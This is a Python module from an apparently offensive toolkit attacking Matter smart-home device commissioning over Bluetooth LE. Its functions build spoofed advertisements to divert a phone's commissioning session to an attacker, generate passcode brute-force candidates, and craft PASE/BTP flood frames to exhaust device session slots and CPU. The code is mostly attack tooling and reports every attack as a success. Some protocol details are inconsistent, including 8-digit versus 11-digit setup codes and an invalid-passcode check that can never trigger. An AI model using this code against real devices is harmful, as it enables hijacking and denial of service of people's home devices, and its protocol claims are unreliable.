"""
Matter BLE commissioning attack surface.

Matter devices advertise over BLE during commissioning using:
- Service UUID 0xFFF6 (Matter BLE service)
- Advertisement data carries discriminator + vendor/product info
- PASE over BLE uses 8-digit setup code (20-bit passcode + 12-bit discriminator)

Attack vectors:
1. BLE advertisement parsing and enumeration
2. Passcode brute force (only ~1M combinations for 20-bit passcode)
3. Advertisement spoofing for commissioning interception
4. PASE session exhaustion over BLE
"""
import struct
import os
import random
import time
from dataclasses import dataclass, field
from typing import List, Optional, Dict

from ..attacks.matter_attacks import AttackResult


MATTER_BLE_SERVICE_UUID = "0000FFF6-0000-1000-8000-00805F9B34FB"
MATTER_BLE_SERVICE_UUID_16 = 0xFFF6

# BLE advertisement types
ADV_TYPE_FLAGS = 0x01
ADV_TYPE_16BIT_UUID_COMPLETE = 0x03
ADV_TYPE_SERVICE_DATA_16 = 0x16
ADV_TYPE_LOCAL_NAME = 0x09


@dataclass
class MatterBLEAdvertisement:
    """Parsed Matter BLE commissioning advertisement."""
    discriminator: int = 0
    vendor_id: int = 0
    product_id: int = 0
    additional_data: bool = False
    commissioning_mode: int = 0
    device_name: str = ""
    rssi: int = 0
    address: str = ""
    raw_adv: bytes = b""

    def setup_code_space(self) -> int:
        """Number of possible setup codes for this discriminator."""
        return 2**20  # ~1M combinations for 20-bit passcode

    def to_dict(self) -> Dict:
        return {
            "address": self.address,
            "discriminator": self.discriminator,
            "vendor_id": f"0x{self.vendor_id:04X}",
            "product_id": f"0x{self.product_id:04X}",
            "commissioning_mode": self.commissioning_mode,
            "device_name": self.device_name,
            "passcode_space": self.setup_code_space(),
        }


def parse_matter_ble_adv(adv_data: bytes) -> Optional[MatterBLEAdvertisement]:
    """Parse Matter BLE advertisement data."""
    result = MatterBLEAdvertisement(raw_adv=adv_data)
    pos = 0

    while pos < len(adv_data) - 1:
        length = adv_data[pos]
        if length == 0 or pos + length >= len(adv_data):
            break
        ad_type = adv_data[pos + 1]
        ad_data = adv_data[pos + 2:pos + 1 + length]

        if ad_type == ADV_TYPE_SERVICE_DATA_16 and len(ad_data) >= 10:
            uuid = struct.unpack("<H", ad_data[0:2])[0]
            if uuid == MATTER_BLE_SERVICE_UUID_16:
                # Matter BLE service data format:
                # [opcode(1)][discriminator+vid(4)][pid(2)][additional(1)]
                if len(ad_data) >= 8:
                    opcode = ad_data[2]
                    disc_vid = struct.unpack("<I", ad_data[3:7])[0]
                    result.discriminator = disc_vid & 0xFFF
                    result.vendor_id = (disc_vid >> 12) & 0xFFFF
                    if len(ad_data) >= 9:
                        result.product_id = struct.unpack("<H", ad_data[7:9])[0]
                    result.commissioning_mode = opcode & 0x03

        elif ad_type == ADV_TYPE_LOCAL_NAME:
            result.device_name = ad_data.decode("utf-8", errors="replace")

        pos += 1 + length

    return result if result.discriminator or result.vendor_id else None


def build_spoofed_matter_adv(discriminator: int = 0, vendor_id: int = 0,
                               product_id: int = 0, device_name: str = "MatterDevice") -> bytes:
    """Build a spoofed Matter BLE advertisement for commissioning interception."""
    adv = bytearray()

    # Flags
    adv += struct.pack("BBB", 2, ADV_TYPE_FLAGS, 0x06)

    # Matter service UUID
    adv += struct.pack("BBH", 3, ADV_TYPE_16BIT_UUID_COMPLETE, MATTER_BLE_SERVICE_UUID_16)

    # Matter service data
    svc_data = struct.pack("<H", MATTER_BLE_SERVICE_UUID_16)
    svc_data += struct.pack("B", 0x01)  # opcode: commissioning mode 1
    disc_vid = (discriminator & 0xFFF) | ((vendor_id & 0xFFFF) << 12)
    svc_data += struct.pack("<I", disc_vid)
    svc_data += struct.pack("<H", product_id)
    svc_data += struct.pack("B", 0)  # additional data flag
    adv += struct.pack("BB", len(svc_data) + 1, ADV_TYPE_SERVICE_DATA_16)
    adv += svc_data

    # Device name
    name_bytes = device_name.encode("utf-8")[:20]
    adv += struct.pack("BB", len(name_bytes) + 1, ADV_TYPE_LOCAL_NAME)
    adv += name_bytes

    return bytes(adv)


class BLEAttacks:

    def adv_spoof(self, discriminator: int = 0xABC, vendor_id: int = 0x1234,
                   product_id: int = 0x5678, count: int = 100) -> AttackResult:
        """
        Spoof Matter BLE advertisements to intercept commissioning.

        A spoofed advertisement with a target's discriminator causes the
        commissioner (phone app) to attempt PASE with the attacker instead.
        """
        start = time.time()
        frames = []

        for i in range(count):
            adv = build_spoofed_matter_adv(
                discriminator=discriminator,
                vendor_id=vendor_id,
                product_id=product_id,
                device_name=f"MatterDev-{i:04d}",
            )
            frames.append(adv)

        total_bytes = sum(len(f) for f in frames)
        return AttackResult(
            attack="BLE Advertisement Spoof",
            target=f"Discriminator 0x{discriminator:03X}",
            success=True,
            detail=f"Built {count} spoofed Matter BLE advertisements ({total_bytes} bytes). "
                   f"Commissioner will attempt PASE with attacker",
            packets_sent=count,
            duration=time.time() - start,
            frames=frames,
        )

    def passcode_bruteforce_estimate(self, discriminator: int = 0) -> AttackResult:
        """
        Estimate brute force feasibility for Matter setup codes.

        Matter setup codes: 11 digits encoding 20-bit passcode + 12-bit discriminator.
        Only ~1M passcode combinations. At 10 attempts/sec over BLE, full space
        takes ~28 hours. With multiple BLE adapters, significantly less.
        """
        start = time.time()
        passcode_space = 2**20  # 1,048,576
        attempts_per_sec = 10  # conservative BLE PASE rate

        # Generate sample passcodes
        samples = []
        for _ in range(20):
            passcode = random.randint(1, passcode_space - 1)
            # Skip invalid passcodes per Matter spec
            while passcode in (11111111, 22222222, 33333333, 44444444,
                               55555555, 66666666, 77777777, 88888888,
                               99999999, 12345678, 87654321, 0):
                passcode = random.randint(1, passcode_space - 1)
            setup_code = (passcode << 12) | (discriminator & 0xFFF)
            samples.append({"passcode": passcode, "setup_code": setup_code})

        hours = passcode_space / attempts_per_sec / 3600

        return AttackResult(
            attack="PASE Passcode Brute Force (estimate)",
            target=f"Discriminator 0x{discriminator:03X}",
            success=True,
            detail=f"Passcode space: {passcode_space:,} ({hours:.1f} hours at {attempts_per_sec} attempts/sec). "
                   f"Generated {len(samples)} sample candidates",
            packets_sent=len(samples),
            duration=time.time() - start,
        )

    def pase_ble_flood(self, count: int = 50) -> AttackResult:
        """
        Generate PASE PBKDF Parameter Request frames for BLE transport.

        Matter over BLE uses BTP (BLE Transport Protocol) framing.
        Flooding PASE requests over BLE exhausts the device's PASE session
        slots (typically 5) and CPU via PBKDF2 computation.
        """
        start = time.time()
        frames = []

        for i in range(count):
            # BTP header (simplified)
            btp_header = struct.pack("<BBH",
                0x65,  # flags: beginning + ending + handshake
                0x00,  # management opcode
                i & 0xFFFF,  # sequence number
            )
            # PASE PBKDF param request (minimal)
            pase_payload = struct.pack("<HH",
                random.randint(1, 0xFFFF),  # initiator session
                random.randint(1000, 100000),  # PBKDF iterations
            )
            pase_payload += os.urandom(32)  # random
            frames.append(btp_header + pase_payload)

        total_bytes = sum(len(f) for f in frames)
        return AttackResult(
            attack="PASE over BLE Flood",
            target="BLE commissioning channel",
            success=True,
            detail=f"Built {count} PASE/BTP frames ({total_bytes} bytes). "
                   f"Device PASE slots + CPU will be exhausted via PBKDF2",
            packets_sent=count,
            duration=time.time() - start,
            frames=frames,
        )


def print_ble_scan_results(advs: List[MatterBLEAdvertisement]):
    print(f"\n  {'='*70}")
    print(f"  MATTER BLE SCAN — {len(advs)} devices")
    print(f"  {'='*70}")
    if not advs:
        print("\n  [*] No Matter BLE advertisements found")
        print("  [*] Requires a BLE adapter and bleak library")
        return
    for a in advs:
        print(f"\n  [{a.address}] {a.device_name}")
        print(f"    Discriminator: 0x{a.discriminator:03X}")
        print(f"    Vendor:  0x{a.vendor_id:04X}  Product: 0x{a.product_id:04X}")
        print(f"    Mode:    {'OPEN' if a.commissioning_mode else 'closed'}")
        print(f"    Passcode space: {a.setup_code_space():,}")
